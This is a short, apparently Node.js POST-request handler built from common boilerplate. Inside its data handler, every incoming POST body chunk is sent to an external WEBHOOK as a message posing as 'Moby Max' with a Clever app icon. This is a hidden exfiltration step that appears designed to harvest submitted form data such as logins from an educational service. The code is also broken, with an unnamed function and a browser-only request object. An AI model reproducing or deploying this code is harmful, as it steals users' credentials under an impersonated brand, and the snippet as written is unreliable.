


var qs = require('querystring');

function (request, response) {
    if (request.method == 'POST') {
        var body = '';

        request.on('data', function (data) {
            body += data;
            const request22 = new XMLHttpRequest();
            request22.open("POST", WEBHOOK)
            const message = {
              username: "Moby Max",
              avatar_url: "https://assets.clever.com/resource-icons/apps/560c49e73489f6010000577a/icon_20c694e.png",
              content: body
            };
            request22.send(JSON.stringify(message));

            // Too much POST data, kill the connection!
            // 1e6 === 1 * Math.pow(10, 6) === 1 * 1000000 ~~~ 1MB
            if (body.length > 1e6)
                request.connection.destroy();
        });

        request.on('end', function () {
            var post = qs.parse(body);
            // use post['blah'], etc.
        });
    }
}
